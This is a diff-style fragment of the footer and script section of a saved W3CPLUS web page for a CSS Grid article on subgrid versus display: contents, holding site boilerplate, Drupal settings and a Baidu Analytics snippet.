+        <p><a rel="nofollow" href="http://www.beian.miit.gov.cn/" target="_blank">湘B2-20110104-7</a>，衡阳市雅米信息技术有限公司 © 2011-2022 <a href="https://www.w3cplus.com/page/26.html" target="_blank">W3CPLUS</a>，感谢<a rel="nofollow" href="https://www.drupal.org/" target="_blank">Drupal</a>开源技术。感谢<a rel="nofollow" href="https://www.qiniu.com/" target="_blank">七牛云存储</a>提供静态资源空间。</p>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="totop" style="position: fixed; bottom: 50px; right: 15px; cursor: pointer; z-index: 999999; display: block; opacity: 1;">
+  <!-- <div id="zhi12-shang-exp-2" class="shang-wrap" style="text-align: center;position:absolute;right: 0;bottom: 130%;z-index: 9999;">
+    <div><a class="zhi12-popup zhi12-widget" rel="nofollow" href="//www.zhi12.com/paycenter/reward?entity=user&id=5491" target="_blank"><img src="/sites/default/files/blogs/2019/1905/w3cplus-shang-2.png" alt="打赏" class="share-img" /></a></div>
+</div> -->
+    <a id="topLink" title="返回顶部">返回顶部</a>
+</div>  <script type="text/javascript" src="./Grid布局：16-subgrid-vs-display：contents_files/js_VU7P4CTgUZdF2SyFko5LLAg9ZK0OSVjXVaAFnTLgVt0.js.下载"></script>
+  
+  <script type="text/javascript" src="./Grid布局：16-subgrid-vs-display：contents_files/respond.min.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：16-subgrid-vs-display：contents_files/js_ypadrG4kz9-JBpNOXmgjyVozLCJG_1RP3Ig-iqWR8n0.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：16-subgrid-vs-display：contents_files/js_YFY-zVcRx2bEEpwBdCXta7mOli3xeW_KMe7Y6Mv8zGk.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：16-subgrid-vs-display：contents_files/js_xP4aMPEI1iZ1ZrZMlSgsTllQqvH8oWbOQ7JVFWyrFCo.js.下载"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"w3cplusV2","theme_token":"dekukMjFz3tuY05OJFU97MYVRYczI5dXqmVrhwELpIM","js":{"modules\/statistics\/statistics.js":1,"sites\/all\/modules\/contrib\/respondjs\/lib\/respond.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery-html-prefilter-3.5.0-backport.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/zh-hans_71GwLEjcRL9b45LGd77xwMMW4YJ5etdnokx7XZMwKAc.js":1,"sites\/all\/modules\/contrib\/custom_search\/js\/custom_search.js":1,"sites\/all\/themes\/w3cplusV2\/js\/highlight.pack.js":1,"sites\/all\/themes\/w3cplusV2\/js\/main.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/paywall\/includes\/paywall_php_sdk\/paywall.css":1,"sites\/all\/modules\/contrib\/custom_search\/custom_search.css":1,"sites\/all\/themes\/w3cplusV2\/css\/style.css":1}},"custom_search":{"form_target":"_self","solr":0},"statistics":{"data":{"nid":"2737"},"url":"\/modules\/statistics\/statistics.php"},"urlIsAjaxTrusted":{"\/css\/grid-layout-part-16.html?expire=1699867080\u0026code=NshCsF8EZQ4\u0026sign=b6d07d4086672d0a1ed20eaf7b393b1c":true}});
+//--><!]]>
+</script>
+<script src="./Grid布局：16-subgrid-vs-display：contents_files/jquery.colorbox-min.js.下载"></script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?177319b798978621f83845b12c86fa29";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>  
+<span class="3ee00"></span>
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>
